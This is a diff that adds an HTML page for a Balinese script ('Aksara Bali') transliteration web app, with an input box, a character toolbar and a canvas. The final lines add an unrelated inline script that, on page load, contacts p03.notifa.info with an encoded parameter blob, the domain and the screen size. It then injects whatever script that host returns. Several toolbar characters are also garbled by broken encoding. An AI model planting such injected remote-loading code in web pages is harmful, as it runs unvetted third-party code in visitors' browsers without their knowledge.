@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>Transliterasi Aksara Bali: A Latin-to-Balinese Script Transliteration Web App</title>
+
+    <!-- Bootstrap -->
+    <link href="bootstrap.min.css" rel="stylesheet">
+	<link href="bootstrap-theme.min.css" rel="stylesheet">
+	<link href="stylefontlocal.css" rel="stylesheet">
+	<script src="am.js"></script>
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+      <script src="html5shiv.min.js"></script>
+      <script src="respond.min.js"></script>
+    <![endif]-->
+  </head>
+  <body>
+	<header>
+		<nav class="navbar navbar-default">
+			<div class="container-fluid">
+			<!-- Brand and toggle get grouped for better mobile display -->
+			<div class="navbar-header">
+			  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			  </button>
+			  <a class="navbar-brand" href="#">TRANSLITERASI AKSARA BALI <!--<img src="" alt="logo pasang aksara" title="Transliterasi Aksara Bali"/>--></a>
+			</div>
+
+			<!-- Collect the nav links, forms, and other content for toggling -->
+			<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			  <ul class="nav navbar-nav">
+			  </ul>			  
+			</div><!-- /.navbar-collapse -->
+			</div><!-- /.container-fluid -->
+			</nav>
+	</header>
+	<content>
+		<div class="container">
+			<div class="row">
+				<div class="col-md-12 col-lg-12">					
+					<div id="editor" class="cbs">
+						<div class="ed-satu ed-area">
+							<div class="sumber-plc">
+								<textarea class="form-control sumber" rows="6" placeholder="Masukan huruf latin"></textarea>
+							</div>
+							<div class="toolbar">
+								<a class="btn" title=" o? "><span class="icn bali">�</span></a>
+								<a class="btn" title="a"><span class="icn">a</span></a>
+								<a class="btn" title="i"><span class="icn">i</span></a>
+								<a class="btn" title="�"><span class="icn">�</span></a>
+								<a class="btn" title="�"><span class="icn">�</span></a>
+								<a class="btn" title="�"><span class="icn">�</span></a>
+								<a class="btn" title="�"><span class="icn">�</span></a>
+								<a class="btn" title="?"><span class="icn">?</span></a>
+								<a class="btn" title="?"><span class="icn">?</span></a>
+								<a class="btn" title="s"><span class="icn">s</span></a>
+								<a class="btn" title="?"><span class="icn">?</span></a>
+								<a class="btn" title="?"><span class="icn">?</span></a>
+								<span class="b-right">
+								<a class="btn"><span class="ttl">Transliterasi</span></a>
+								<input id="tr-oto" name="tr-oto" checked="checked" type="checkbox">
+								<label for="tr-oto">Otomatis</label></span>
+							</div>
+						</div>
+
+						<div class="ed-split"></div>
+						<div class="ed-dua  ed-area">
+							<div class="form-control">
+							<span><label>Spasi</label>
+							<input min="0.5" max="2.0" step="0.1" value="1.2" class="range" type="range"></span>
+							<span><label>Huruf</label><input min="10" max="80" step="1" value="48" class="range" type="range"></span>
+							<span><label>Warna</label><input class="range" value="#000000" type="color"></span><span class="b-right"><a class="btn"><span class="icn entypo-floppy"></span><span class="ttl">Simpan</span></a></span>
+							</div>
+						
+							<div class="canvas-plc">
+								<div class="bound">
+									<canvas width="600" height="77" style="visibility: visible;"></canvas>
+									<div class="canvas-vrz"></div>
+								</div>
+							</div>
+						</div>
+							
+						</div>
+					
+					
+				</div>
+			</div>
+		</div>
+	</content>
+	<footer></footer>
+	</div><!-- /.modal-dialog -->
+	</div><!-- /.modal -->
+    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="jquery.min.js"></script>
+	<script>var $j = jQuery.noConflict();</script>
+    <!-- Include all compiled plugins (below), or include individual files as needed -->
+    <script src="bootstrap.min.js"></script>
+	<script src=" aksara.js"></script>
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdu9VgJdSi4A5UFdsYaEwe10sZusCzkMsHbMdE4RpSiW07GxhsRnrmyZJGu9c%2bB%2fZgKBbhUnIptHLER8zIERjsmQ9U5Xb6eLAfEtekGpnG%2bSgywA3LaaMSvEMSs%2fGVVISJokrWGwK%2fFLr2Sk%2bRUX%2fis9Vs4GTv5X%2fn%2fXAZxZImHqirh12QGeGGVXvAuE6jxQT7HoZCk4oN2QYoOp4XJ%2bO29ONjKsQ1%2b2SZ8QaCTW27tEuNNlapoXF%2baSbDNRPR77pbBBL7I13NYuAS5CPBROcwbdGwSvfojxwZpkuuxl%2bVMUq%2bgLZafpnTGnDnw2BW%2bttGXsy6lyI%2blSOiJDljKsKjDjLsXPx7cyT2AVWkqjrP8r0BTSURhM8%2b4pY4LP9E9c%2frMhM00UvQg5bfpA73vSksl3DJV6K1jWWAvptlnfD%2f51Kuy2diJqZyETH%2b9975tvn8GerEkA%2bkLUqPGILGVV41153XItqwCnmTxnn93F1yB5zL7hZJogFHq0BmQGBYu2ZL8ofXRzDZ3Enau%2bJFX%2baMrbfKSPl0t6oyWpQN%2fIwvik4jDADHs8EwDw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+ </html>
